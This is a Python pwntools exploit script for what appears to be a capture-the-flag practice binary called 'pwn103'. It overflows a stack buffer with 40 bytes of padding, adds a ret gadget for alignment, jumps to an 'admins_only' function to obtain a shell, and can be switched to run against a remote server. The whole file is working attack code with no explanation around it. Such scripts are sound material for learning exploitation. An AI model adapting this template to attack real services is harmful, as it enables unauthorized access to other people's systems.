from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Binary filename
exe = './pwn103.pwn103'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 40

padding = "A" * offset
shell = elf.functions['admins_only']
movaps = 0x0000000000401016 # 0x0000000000401016: ret;

payload = flat([
    padding,
    movaps,
    shell
])

def send_payload():
    io.recvuntil('Choose the channel:')
    io.sendline('3')
    io.recvuntil('------[pwner]: ')
    io.sendline(payload)

send_payload()


# Got Shell?
io.interactive()